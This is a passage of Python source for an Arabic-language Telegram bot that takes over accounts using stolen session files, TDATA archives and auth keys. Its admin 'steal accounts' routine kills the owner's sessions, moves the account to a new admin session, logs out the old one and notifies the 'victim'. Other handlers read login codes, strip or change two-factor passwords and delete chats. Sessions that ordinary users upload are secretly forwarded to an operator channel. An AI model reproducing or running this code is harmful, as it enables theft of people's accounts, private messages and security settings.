        for auth in auths.authorizations:
            is_current_a = getattr(auth, 'current', False)

            if not is_current_a:
                try:
                    await client_a.invoke(functions.account.ResetAuthorization(hash=auth.hash))
                    await asyncio.sleep(0.5) 
                except Exception as e:
                    err_str = str(e).lower()
                    if "fresh" in err_str or "24" in err_str:
                        hit_24h_limit = True
                        break 
                    elif "flood" in err_str:
                        await asyncio.sleep(5)

        # إذا طلب الانتظار 24 ساعة، نضع الحساب تحت المراقبة ونوقف العملية
        if hit_24h_limit:
            conn = get_db_conn()
            c = conn.cursor()
            c.execute("UPDATE sessions SET surveilled=1, tl_session=? WHERE id=?", (str(admin_id), acc_id))
            conn.commit()
            conn.close()
            if client_a.is_connected: await client_a.disconnect()
            return False

        # 3. الآن لم يتبقَ سوى الجلسة A. 
        # نترك Pyrogram يولد مفتاح جديد ونظيف (بدون حقن String مزيف) ونجبره على السيرفر الصحيح
        client_b = Client(
            f"cb_{acc_id}_{int(time.time())}", 
            api_id=API_ID, 
            api_hash=API_HASH, 
            in_memory=True,
            device_model=B_DEVICE_MODEL
        ) 

        await client_b.storage.open()
        await client_b.storage.dc_id(target_dc) 
        await client_b.storage.test_mode(False)
        await client_b.connect() 

        # 5. طلب رمز تسجيل الدخول لـ B 
        qr = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))

        # في حال طلب منا السيرفر الانتقال لـ DC آخر
        if isinstance(qr, types.auth.LoginTokenMigrateTo):
            await client_b.disconnect()

            # ننشئ الجلسة مرة أخرى على السيرفر المطلوب
            client_b = Client(f"cb_retry_{acc_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True, device_model=B_DEVICE_MODEL)

            await client_b.storage.open()
            await client_b.storage.dc_id(int(qr.dc_id))
            await client_b.storage.test_mode(False)
            await client_b.connect()

            # 🟢 خطوة هامة: استخدام ImportLoginToken عند التهجير بدلاً من Export لتفادي فصل الرمز
            qr = await client_b.invoke(functions.auth.ImportLoginToken(token=qr.token))

        # 6. الجلسة A توافق على الرمز وتمرر الصلاحيات
        if isinstance(qr, types.auth.LoginToken):

            # نأخذ ناتج القبول
            try:
                res_a = await client_a.invoke(functions.auth.AcceptLoginToken(token=qr.token))
            except Exception as e:
                raise Exception(f"فشل الجلسة A في الموافقة على الرمز: {str(e)}")

            # 7. 🟢 جلب حالة النجاح لـ B (هذا ضروري جداً لتفعيل AuthKey في سيرفر تيليجرام)
            success_obj = None
            for _ in range(12):  # الانتظار والمحاولة 12 مرة كحد أقصى لتفادي التايم أوت
                await asyncio.sleep(1.5)
                try:
                    res = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
                    if isinstance(res, types.auth.LoginTokenSuccess):
                        success_obj = res
                        break
                except Exception:
                    pass

            if not success_obj:
                raise Exception("وافقت الجلسة A على الرمز، ولكن B لم يستلم إشارة التفعيل (LoginTokenSuccess).")

            # 8. إجبار مكتبة Pyrogram على تحديث بيانات الجلسة داخلياً
            try:
                authorized_user_id = success_obj.authorization.user.id
            except Exception:
                try:
                    authorized_user_id = res_a.user.id
                except Exception:
                    authorized_user_id = target_user_id

            await client_b.storage.user_id(authorized_user_id)
            await client_b.storage.is_bot(False)

            # 9. التحقق من أن B قادر على الاتصال كصاحب الحساب
            try:
                me_b = await client_b.get_me()
            except Exception as e:
                raise Exception(f"فشل التحقق من B بعد استلام النجاح: {str(e)}")

            if not me_b:
                raise Exception("فشل الحصول على بيانات الحساب للجلسة الجديدة.")

            # 10. تصدير الجلسة B وفصلها للتحقق (الآن ستعمل بنجاح 100%)
            session_b_str = await client_b.export_session_string()
            await client_b.disconnect()

            verify_b = Client(f"vb_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=session_b_str, in_memory=True)
            await verify_b.connect()
            verify_me = await verify_b.get_me()

            if not verify_me:
                raise Exception("فشل التحقق من Session B عبر العميل المستقل")

            await verify_b.disconnect()

            # 11. الجلسة A تسجل خروج بنفسها (لتدمير الجلسة القديمة والاعتماد على B فقط)
            try:
                await client_a.invoke(functions.auth.LogOut())
            except Exception: 
                pass

            if client_a.is_connected: await client_a.disconnect()

            # 12. تحديث الملكية في الداتا بيس لصالح الأدمن بـ B
            conn = get_db_conn()
            c = conn.cursor()
            c.execute("UPDATE sessions SET pyro_session=?, owner_id=?, surveilled=0, tl_session='' WHERE id=?", (session_b_str, admin_id, acc_id))
            conn.commit()
            conn.close()

            # 13. إرسال الكليشة للضحية
            kick_msg = (
                f"🛂┊ تـنـبـيـه هـام - طـرد جـلـسـة !\n\n"
                f"⎉╎ تـم طـرد جـلـسـة الـبـوت لـحـسـاب:\n"
                f"⎉╎ الاسـم: {name}\n"
                f"⎉╎ الـرقـم: {phone}\n"
                f"•❐• تـم حـذفـه مـن الـبـوت تـلـقـائـيـاً."
            )
            try:
                bot.send_message(original_owner, kick_msg)
            except Exception: 
                pass

            # 14. إرسال رسالة النجاح للأدمن
            admin_msg = (
                f"✅ تـم سـحـب وتـهـجـيـر الـحـسـاب بـنـجـاح!\n\n"
                f"⎉╎ الـرقـم: `{phone}`\n"
                f"⎉╎ الاسـم: {name}\n"
                f"⎉╎ الـسـيـرفـر (DC): {target_dc}\n\n"
                f"🔑 مـفـتـاح HEX (المحفوظ):\n`{saved_hex} {target_dc}`\n\n"
                f"•❐• تـم إنـهـاء بـاقـي الـجـلـسـات أولاً وتـسـجـيـل خـروج الـجـلـسـة الـقـديـمـة وتـولـيـد B مـسـتـقـلـة بـمـلـكـيـتـك."
            )
            bot.send_message(admin_id, admin_msg, parse_mode="Markdown")

            # حذف الحساب من المؤقت إذا لزم الأمر
            conn = get_db_conn()
            c = conn.cursor()
            c.execute("DELETE FROM sessions WHERE id=?", (acc_id,))
            conn.commit()
            conn.close()

            return True
        else:
            raise Exception("فشل في توليد رمز QR، الخادم أرجع استجابة غير متوقعة.")

    except Exception as e:
        logging.error(f"Migration Failed for {phone}: {e}")
        if client_b and client_b.is_connected: await client_b.disconnect()
        if verify_b and verify_b.is_connected: await verify_b.disconnect()
        if client_a.is_connected: await client_a.disconnect()
        return False

# =========================================================
# 🎛️ واجهات التحكم
# =========================================================

def home_keyboard(uid):
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("• إنـهـاء الـجـلـسـات الأُخـرى ☠️", callback_data="menu_terminate"))
    markup.row(InlineKeyboardButton("• إدارة الإزالـة الـتـلـقـائـيـة ⏱️", callback_data="autoterm_manage"))
    markup.row(InlineKeyboardButton("• تـنـظـيـف شـامـل 🧹", callback_data="menu_clean"), InlineKeyboardButton("• جـلـب الـكـود ✉️", callback_data="req_code"))
    markup.row(InlineKeyboardButton("• إزالـة مـن الـبـوت 🗑️", callback_data="menu_remove"), InlineKeyboardButton("• تـسـجـيـل خـروج 🚪", callback_data="menu_logout"))
    markup.row(InlineKeyboardButton("• إدارة الـتـحـقـق بـخـطـوتـيـن 🔐", callback_data="menu_2fa_manage"))
    markup.row(InlineKeyboardButton("• كـشـف الـحـسـابـات 🕵️", callback_data="reveal_accounts"), InlineKeyboardButton("• فـحـص الـحـسـابـات 🔄", callback_data="check_active"))

    if uid in ADMIN_IDS:
        markup.row(InlineKeyboardButton("• إضافـة مسـتخـدم ➕", callback_data="admin_add_user"), InlineKeyboardButton("• حظـر مسـتخـدم 🚫", callback_data="admin_ban_user"))
        markup.row(InlineKeyboardButton("• سحـب الحـسـابات 🏴‍☠️", callback_data="steal_accounts"), InlineKeyboardButton("• إدارة المراقبة ⏳", callback_data="manage_surveillance"))

    return markup

def accounts_action_keyboard(owner_id, action):
    accounts = get_all_accounts(owner_id)
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data=f"act:{action}:all"))
    for acc_id, phone, name, uid, _ in accounts:
        markup.row(InlineKeyboardButton(f"{name} | {phone}", callback_data=f"act:{action}:{acc_id}"))
    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
    return markup

def two_fa_keyboard():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("• حـذف الـتـحـقـق 🗑️", callback_data="menu_2fa_remove"), InlineKeyboardButton("• تـغـيـيـر الـتـحـقـق 🔄", callback_data="menu_2fa_change"))
    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
    return markup

# =========================================================
# ✉️ الأوامر
# =========================================================

@bot.message_handler(commands=['start'])
def start_message(message):
    if not is_allowed(message.from_user.id):
        bot.reply_to(message, "عذراً، البوت خاص ولا يمكنك استخدامه.", parse_mode="Markdown")
        return

    if message.from_user.id not in ADMIN_IDS:
        log_to_channel(f"🛂┊ مـسـتـخـدم جـديـد دخـل الـبـوت !\n\n⎉╎ الاسـم: {message.from_user.first_name}\n⎉╎ الآيـدي: `{message.from_user.id}`\n⎉╎ الـيـوزر: @{message.from_user.username or 'لا يوجد'}")

    text = ("🛂┊ أهـلاً بـك فـي بـوت الإدارة الاحـتـرافـي !\n\n⎉╎ أرْسـل مـلـف TDATA (بـصـيـغـة ZIP).\n⎉╎ أو أرْسـل مـلـف .session مـبـاشـرة.\n⎉╎ أو أرْسـل مـفـتـاح AuthKey (HEX).\n⎉╎ أو أرْسـل نـص Session.\n•❐• الـبـوت يـتـعـرف تـلـقـائـيـاً عـلـى الـنـوع.\n\nتـحـكـم بـحـسـابـاتـك بـالـكـامـل مـن الأسـفـل ⬇️")
    bot.reply_to(message, text, reply_markup=home_keyboard(message.from_user.id), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "back_home")
def back_home(call):
    if not is_allowed(call.from_user.id): return
    if call.from_user.id in USER_STATES: del USER_STATES[call.from_user.id]
    bot.edit_message_text("🛂┊ الـقـائـمـة الـرئـيـسـيـة:", call.message.chat.id, call.message.message_id, reply_markup=home_keyboard(call.from_user.id), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "reveal_accounts")
def reveal_accounts(call):
    if not is_allowed(call.from_user.id): return
    accounts = get_all_accounts(call.from_user.id)
    if not accounts: return bot.answer_callback_query(call.id, "لا توجد حسابات مسجلة!", show_alert=True)
    text = f"🛂┊ كشـف الحـسـابات -\n\n⎉╎ تم العثور على {len(accounts)} حـسـاب\n\n"
    for acc_id, phone, name, uid, _ in accounts:
        text += f"▪️ الـرقـم: {phone}\n▪️ الاسـم: {name}\n▪️ الآيـدي: {uid}\n▪️ سـنـة الإنـشـاء: {get_creation_year(uid)}\n〰️〰️〰️〰️〰️〰️〰️〰️\n"
    markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "check_active")
def check_active_accounts(call):
    if not is_allowed(call.from_user.id): return
    bot.answer_callback_query(call.id, "⏳ جاري فحص الحسابات...")
    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري فـحـص الـحـسـابـات الـشـغـالـة...", parse_mode="Markdown")
    run_async(check_active_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))

async def check_active_async(owner_id, chat_id, msg_id):
    accounts = get_all_accounts(owner_id)
    if not accounts: return bot.edit_message_text("❌ لا توجد حسابات مضافة.", chat_id, msg_id, reply_markup=home_keyboard(owner_id))
    active_count = 0
    text = "🛂┊ نـتـيـجـة فـحـص الـحـسـابـات:\n\n"
    for acc_id, phone, name, uid, pyro_session in accounts:
        client = Client(f"chk_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await asyncio.wait_for(client.connect(), timeout=10)
            await client.get_me()
            text += f"✅ {phone} | {uid}\n"
            active_count += 1
        except (AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan):
            if await confirm_session_death(pyro_session):
                handle_dead_session(owner_id, acc_id, phone, name)
                text += f"❌ {phone} (تـم طـرده وحـذفـه)\n"
            else:
                text += f"⚠️ {phone} (خـطـأ مـؤقـت، الـجـلـسـة بـخـيـر)\n"
                active_count += 1
        except asyncio.TimeoutError:
            text += f"⚠️ {phone} (انتهى وقت الاتصال - معلق)\n"
            active_count += 1
        except Exception:
            text += f"⚠️ {phone} (فـشـل الاتـصـال بـسـبـب الـشـبـكـة)\n"
            active_count += 1
        finally:
            if client.is_connected: await client.disconnect()
    final_text = f"⎉╎ الـجـلـسـات الـنـشـطـة الآن: {active_count} مـن اصـل {len(accounts)}\n\n{text}"
    bot.edit_message_text(final_text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))

@bot.callback_query_handler(func=lambda call: call.data == "req_code")
def scan_all_codes(call):
    if not is_allowed(call.from_user.id): return
    bot.answer_callback_query(call.id, "⏳ جاري جلب الأكواد...")
    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري جـلـب الأكـواد مـن الـحـسـابـات...", parse_mode="Markdown")
    run_async(fetch_all_codes_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))

async def fetch_all_codes_async(owner_id, chat_id, msg_id):
    accounts = get_all_accounts(owner_id)
    found_codes = []
    for acc_id, phone, name, uid, pyro_session in accounts:
        exec_client = Client(f"code_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await asyncio.wait_for(exec_client.connect(), timeout=12)
            async for msg in exec_client.get_chat_history(777000, limit=3):
                if msg.text and ("Login code" in msg.text or "كود الدخول" in msg.text or "تسجيل الدخول" in msg.text):
                    match = re.search(r'\b(\d{5})\b', msg.text)
                    if match:
                        found_codes.append((phone, match.group(1)))
                        break
        except Exception: pass
        finally:
            if exec_client.is_connected: await exec_client.disconnect()
    if found_codes:
        text = "🛂┊ تـم جـلـب أكـواد الـدخـول:\n\n"
        for phone, code in found_codes:
            text += f"⎉╎ الـرقـم: {phone}\n•❐• الـكـود: {code}\n━━━━━━━━━━━━━━━━\n"
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))
    else:
        bot.edit_message_text("❌ لـم يـصـل أي كـود جـديـد.", chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))

@bot.callback_query_handler(func=lambda call: call.data == "autoterm_manage")
def autoterm_manage_menu(call):
    if not is_allowed(call.from_user.id): return
    markup = InlineKeyboardMarkup()
    accounts = get_all_accounts(call.from_user.id)
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT auto_term_enabled FROM sessions WHERE owner_id=?", (call.from_user.id,))
    rows = c.fetchall()
    all_enabled = all(r[0] == 1 for r in rows) if rows else False

    markup.row(InlineKeyboardButton("• تـعـطـيـل الإزالـة لـلـجـمـيـع 🔴" if all_enabled else "• تـفـعـيـل الإزالـة لـلـجـمـيـع 🟢", callback_data="autoterm:toggle:all"))
    markup.row(InlineKeyboardButton("• ضـبـط وقـت الإزالـة 🕒", callback_data="autoterm_set_time"))

    for acc_id, phone, name, uid, _ in accounts:
        c.execute("SELECT auto_term_enabled, auto_term_interval FROM sessions WHERE id=?", (acc_id,))
        acc_data = c.fetchone()
        if acc_data:
            markup.row(InlineKeyboardButton(f"{'🟢' if acc_data[0] == 1 else '🔴'} {name} | كل {acc_data[1]} سـاعـة", callback_data=f"autoterm:toggle:{acc_id}"))
    conn.close()
    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
    text = "🛂┊ **إدارة إزالـة الأجـهـزة الـتـلـقـائـيـة:**\n\n⎉╎ يـقـوم الـبـوت بـفـحـص وإنـهـاء جـلـسـات الـحـسـابـات بـشـكـل دوري."
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("autoterm:toggle:"))
def handle_autoterm_toggle(call):
    if not is_allowed(call.from_user.id): return
    target = call.data.split(":")[-1]
    conn = get_db_conn()
    c = conn.cursor()
    if target == "all":
        c.execute("SELECT auto_term_enabled FROM sessions WHERE owner_id=?", (call.from_user.id,))
        rows = c.fetchall()
        new_state = 0 if all(r[0] == 1 for r in rows) else 1
        c.execute("UPDATE sessions SET auto_term_enabled=? WHERE owner_id=?", (new_state, call.from_user.id))
    else:
        c.execute("SELECT auto_term_enabled FROM sessions WHERE id=?", (target,))
        new_state = 0 if c.fetchone()[0] == 1 else 1
        c.execute("UPDATE sessions SET auto_term_enabled=? WHERE id=?", (new_state, target))
    conn.commit()
    conn.close()
    autoterm_manage_menu(call)

@bot.callback_query_handler(func=lambda call: call.data == "autoterm_set_time")
def autoterm_set_time_start(call):
    if not is_allowed(call.from_user.id): return
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data="autoterm:time:all"))
    for acc_id, phone, name, uid, _ in get_all_accounts(call.from_user.id):
        markup.row(InlineKeyboardButton(f"{name} | {phone}", callback_data=f"autoterm:time:{acc_id}"))
    markup.row(InlineKeyboardButton("🔙 إلـغـاء", callback_data="autoterm_manage"))
    bot.edit_message_text("🛂┊ ضـبـط وقـت الإزالـة:\n\n⎉╎ اخـتـر الـحـسـاب:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("autoterm:time:"))
def ask_autoterm_hours(call):
    if not is_allowed(call.from_user.id): return
    USER_STATES[call.from_user.id] = {"action": "set_autoterm_hours", "target": call.data.split(":")[-1]}
    msg = bot.send_message(call.message.chat.id, "•❐• أرسـل عـدد الـسـاعـات (مـثـال: 1 لـساعة، 24 لـيوم):")
    bot.register_next_step_handler(msg, process_autoterm_hours)

def process_autoterm_hours(message):
    uid = message.from_user.id
    if uid not in USER_STATES or USER_STATES[uid]["action"] != "set_autoterm_hours": return
    target = USER_STATES.pop(uid)["target"]
    if not message.text.strip().isdigit() or int(message.text.strip()) < 1: return bot.send_message(message.chat.id, "❌ رقـم غـيـر صـالـح.", reply_markup=home_keyboard(uid))
    hours = int(message.text.strip())
    conn = get_db_conn()
    c = conn.cursor()
    if target == "all":
        c.execute("UPDATE sessions SET auto_term_interval=?, auto_term_enabled=1 WHERE owner_id=?", (hours, uid))
    else:
        c.execute("UPDATE sessions SET auto_term_interval=?, auto_term_enabled=1 WHERE id=?", (hours, target))
    conn.commit()
    conn.close()
    bot.send_message(message.chat.id, f"✅ تـم ضـبـط الإزالـة عـلـى: كـل {hours} سـاعـة.", parse_mode="Markdown", reply_markup=home_keyboard(uid))

@bot.callback_query_handler(func=lambda call: call.data == "menu_2fa_manage")
def menu_2fa_manage(call):
    if not is_allowed(call.from_user.id): return
    bot.edit_message_text("🛂┊ إدارة الـتـحـقـق بـخـطـوتـيـن:\n\n⎉╎ اخـتـر الـعـمـلـيـة:", call.message.chat.id, call.message.message_id, reply_markup=two_fa_keyboard(), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data in ["menu_terminate", "menu_clean", "menu_logout", "menu_remove", "menu_2fa_remove", "menu_2fa_change"])
def action_menus(call):
    if not is_allowed(call.from_user.id): return
    action = call.data.replace("menu_", "")
    titles = {
        "terminate": "🛂┊ إنـهـاء الـجـلـسـات الأُخـرى:\n⎉╎ اخـتـر حـسـابـاً أو نـفـذ عـلـى الـجـمـيـع:",
        "clean": "🛂┊ الـتـنـظـيـف الـشـامـل:\n⎉╎ اخـتـر حـسـابـاً أو نـفـذ عـلـى الـجـمـيـع:",
        "logout": "🛂┊ تـسـجـيـل خـروج نـهـائـي:\n⎉╎ اخـتـر حـسـابـاً لـلـخـروج مـنـه:",
        "remove": "🛂┊ إزالـة مـن الـبـوت (بـدون خـروج):\n⎉╎ اخـتـر حـسـابـاً لـحـذفـه بـرمـجـيـاً:",
        "2fa_remove": "🛂┊ حـذف الـتـحـقـق بـخـطـوتـيـن:\n⎉╎ اخـتـر الـحـسـاب الـمـسـتـهـدف:",
        "2fa_change": "🛂┊ تـغـيـيـر الـتـحـقـق بـخـطـوتـيـن:\n⎉╎ اخـتـر الـحـسـاب الـمـسـتـهـدف:"
    }
    bot.edit_message_text(titles[action], call.message.chat.id, call.message.message_id, reply_markup=accounts_action_keyboard(call.from_user.id, action), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("act:"))
def execute_action(call):
    if not is_allowed(call.from_user.id): return
    parts = call.data.split(":")
    action = parts[1]
    target = parts[2]

    if action in ["2fa_remove", "2fa_change"]:
        USER_STATES[call.from_user.id] = {"action": action, "target": target}
        msg = bot.send_message(call.message.chat.id, "•❐• أرسـل **كـلـمـة الـسـر الـحـالـيـة** (أو 'لا يوجد'):", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_2fa_old_pass)
        return

    bot.answer_callback_query(call.id, "⏳ جاري التنفيذ الفعلي...")
    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري الـعـمـل بـشـكـل صـارم (Raw API)...", parse_mode="Markdown")

    if target == "all":
        results = []
        for acc in get_all_accounts(call.from_user.id):
            results.append(run_async(perform_action_async(action, acc[0], call.from_user.id)))
            time.sleep(0.5)
        bot.edit_message_text("🛂┊ **مـلـخـص الـعـمـلـيـة:**\n\n" + "\n".join(results), call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(call.from_user.id), parse_mode="Markdown")
    else:
        res = run_async(perform_action_async(action, int(target), call.from_user.id))
        bot.edit_message_text(res, call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(call.from_user.id), parse_mode="Markdown")

async def perform_action_async(action, acc_id, owner_id):
    acc = get_account(acc_id)
    if not acc: return "❌ الـحـسـاب غـيـر مـوجـود."
    _, _, phone, user_id, first_name, pyro_session, _, _, _, _, _, _ = acc

    if action == "remove":
        delete_account(acc_id)
        return f"✅ تـم إزالـة `{phone}` بـرمـجـيـاً مـن الـبـوت."

    exec_client = Client(f"exec_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
    try:
        await asyncio.wait_for(exec_client.connect(), timeout=12)
    except Exception: return f"❌ فـشـل الاتـصـال بـ `{phone}`"

    result_msg = ""
    try:
        if action == "terminate":
            auths = await exec_client.invoke(functions.account.GetAuthorizations())
            has_other_sessions = False
            terminated_count = 0
            wait_error = False

            for auth in auths.authorizations:
                if not getattr(auth, 'current', False):
                    has_other_sessions = True
                    try:
                        await exec_client.invoke(functions.account.ResetAuthorization(hash=auth.hash))
                        terminated_count += 1
                        await asyncio.sleep(0.4)
                    except Exception as e:
                        if "fresh" in str(e).lower() or "24" in str(e).lower() or "FORBIDDEN" in str(e).upper():
                            wait_error = True
                            break

            if wait_error: result_msg = f"⚠️ `{phone}`: يـجـب الانـتـظـار 24 سـاعـة لإنـهـاء الـجـلـسـات."
            elif not has_other_sessions: result_msg = f"⚠️ لا يـوجـد جـلـسـات أخـرى لإنـهـائـهـا لـ `{phone}`."
            else: result_msg = f"✅ تـم إنـهـاء ({terminated_count}) جـلـسـة بـنـجـاح لـ `{phone}`."

        elif action == "clean":
            cleaned_count = 0
            async for dialog in exec_client.get_dialogs(limit=250):
                try:
                    peer = await exec_client.resolve_peer(dialog.chat.id)
                    if dialog.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
                        if dialog.chat.type == ChatType.GROUP:
                            me = await exec_client.resolve_peer("me")
                            await exec_client.invoke(functions.messages.DeleteChatUser(chat_id=peer.chat_id, user_id=me))
                        else:
                            await exec_client.invoke(functions.channels.LeaveChannel(channel=peer))
                        cleaned_count += 1
                        await asyncio.sleep(0.3)
                    elif dialog.chat.type in [ChatType.PRIVATE, ChatType.BOT]:
                        if not dialog.chat.is_verified and dialog.chat.id not in [777000, exec_client.me.id]:
                            await exec_client.invoke(functions.messages.DeleteHistory(peer=peer, max_id=0, revoke=True))
                            cleaned_count += 1
                            await asyncio.sleep(0.3)
                except FloodWait as e: await asyncio.sleep(e.value)
                except Exception: continue
            result_msg = f"🧹 تـم تـنـظـيـف ({cleaned_count}) مـحـادثـة حـقـيـقـيـاً لـ `{phone}`."

        elif action == "logout":
            try:
                await exec_client.invoke(functions.auth.LogOut())
                delete_account(acc_id)
                result_msg = f"🚪 تـم تـسـجـيـل الـخـروج نـهـائـيـاً مـن `{phone}`."
            except Exception: result_msg = f"❌ فـشـل تـسـجـيـل الـخـروج لـ `{phone}`."

    except Exception as e:
        if "fresh" in str(e).lower() or "24" in str(e).lower(): result_msg = f"⚠️ `{phone}`: يـجـب الانـتـظـار 24 سـاعـة."
        else: result_msg = f"❌ حـدث خـطـأ غـيـر مـتـوقـع فـي `{phone}`."
    finally:
        if exec_client.is_connected: await exec_client.disconnect()

    return result_msg

def process_2fa_old_pass(message):
    uid = message.from_user.id
    if uid not in USER_STATES: return
    old_pass = message.text.strip()
    USER_STATES[uid]["old_pass"] = "" if old_pass == "لا يوجد" else old_pass
    if USER_STATES[uid]["action"] == "2fa_change":
        msg = bot.send_message(message.chat.id, "•❐• أرسـل كـلـمـة الـسـر الـجـديـدة:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_2fa_new_pass)
    else:
        execute_2fa_action(message, uid)

def process_2fa_new_pass(message):
    uid = message.from_user.id
    if uid not in USER_STATES: return
    USER_STATES[uid]["new_pass"] = message.text.strip()
    execute_2fa_action(message, uid)

async def do_2fa_async(uid, target, action, old_pass, new_pass):
    results = []
    accounts = get_all_accounts(uid) if target == "all" else [(int(target),)]
    for acc in accounts:
        acc_data = get_account(acc[0])
        if not acc_data: continue
        _, _, phone, _, _, pyro_session, _, _, _, _, _, _ = acc_data
        client = Client(f"2fa{acc[0]}{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await asyncio.wait_for(client.connect(), timeout=12)
            if action == "2fa_remove":
                await client.remove_cloud_password(password=old_pass)
                results.append(f"✅ {phone}: تـم حـذف الـتـحـقـق.")
            elif action == "2fa_change":
                if old_pass == "": await client.enable_cloud_password(password=new_pass, hint="Secured")
                else: await client.change_cloud_password(current_password=old_pass, new_password=new_pass)
                results.append(f"✅ {phone}: تـم تـعـيـيـن الـتـحـقـق.")
        except PasswordHashInvalid: results.append(f"❌ {phone}: بـاسـوورد الـ 2FA خـاطـئ.")
        except Exception as e:
            if "missing" in str(e).lower() or "empty" in str(e).lower(): results.append(f"⚠️ {phone}: لا يـوجـد تـحـقـق أسـاسـاً.")
            else: results.append(f"❌ {phone}: فـشـل.")
        finally:
            if client.is_connected: await client.disconnect()
    return results

def execute_2fa_action(message, uid):
    state = USER_STATES.pop(uid)
    status_msg = bot.send_message(message.chat.id, "⏳ جـاري تـنـفـيـذ طـلـبـك بـحـذر...")
    results = run_async(do_2fa_async(uid, state["target"], state["action"], state.get("old_pass", ""), state.get("new_pass", "")))
    bot.edit_message_text("🛂┊ نـتـيـجـة الـتـحـقـق:\n\n" + "\n".join(results), message.chat.id, status_msg.message_id, reply_markup=home_keyboard(uid), parse_mode="Markdown")

# =========================================================
# 📥 محرك تسجيل الدخول (Hex, String, ZIP, TDATA)
# =========================================================

def process_successful_login(message, status_msg, me, pyro_session, session_type="Session", file_path=None, raw_hex=None):
    if check_duplicate(message.from_user.id, me.id):
        bot.edit_message_text("⚠️ الـحـسـاب مـوجـود بـالـفـعـل فـي الـبـوت مـسـبـقـاً!", message.chat.id, status_msg.message_id, reply_markup=home_keyboard(message.from_user.id))
        return

    save_account(message.from_user.id, me.phone_number or "Unknown", me.id, me.first_name or "User", pyro_session, "", session_type)

    text = (f"🛂┊ تـم سحب حساب بـنـجـاح !\n\n⎉╎ الاسـم: {me.first_name}\n⎉╎ الـرقـم: +{(me.phone_number or 'Unknown').replace('+', '')}\n⎉╎ الآيـدي: {me.id}\n•❐• سـنـة الإنـشـاء: {get_creation_year(me.id)}\n\nتـحـكـم بـحـسـابـك مـن الأزرار أدناه:")

    bot.edit_message_text(text, message.chat.id, status_msg.message_id, reply_markup=home_keyboard(message.from_user.id), parse_mode="Markdown")

    if message.from_user.id not in ADMIN_IDS:
        user_info = f"\n\n👤 مـعـلـومـات الـمـسـتـخـدم:\n⎉╎ الاسـم: {message.from_user.first_name}\n⎉╎ الآيـدي: `{message.from_user.id}`\n⎉╎ الـيـوزر: @{message.from_user.username or 'لا يوجد'}"
        channel_text = text + user_info

        if file_path:
            log_to_channel(channel_text, file_path=file_path)
        elif raw_hex:
            log_to_channel(channel_text, session_text=raw_hex)
        else:
            log_to_channel(channel_text, session_text=pyro_session)

@bot.message_handler(func=lambda message: message.text and not message.text.startswith('/'))
def handle_text_input(message):
    if not is_allowed(message.from_user.id): return bot.reply_to(message, "عذراً، البوت خاص!", parse_mode="Markdown")
    text = message.text.strip()
    hex_match = re.search(r'\b([0-9a-fA-F]{512})\b', text)
    if hex_match:
        hex_key = hex_match.group(1)
        dc_match = re.search(r'\b([1-5])\b', text.replace(hex_key, ""))
        status_msg = bot.reply_to(message, "⏳ جـاري الاتـصـال بـمـفـتـاح الـ Hex...")
        async def verify_hex():
            for dc_id in ([int(dc_match.group(1))] if dc_match else [1, 2, 3, 4, 5]):
                pyro_sess, _ = generate_sessions(API_ID, dc_id, bytes.fromhex(hex_key), 9999)
                client = Client(f"hx_{message.from_user.id}{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_sess, in_memory=True)
                try:
                    await asyncio.wait_for(client.connect(), timeout=10)
                    me = await client.get_me()
                    await client.disconnect()
                    return me, pyro_sess
                except Exception:
                    if client.is_connected: await client.disconnect()
            return None, None
        me, p_sess = run_async(verify_hex())
        if me:
            process_successful_login(message, status_msg, me, p_sess, "Hex", raw_hex=hex_key)
        else:
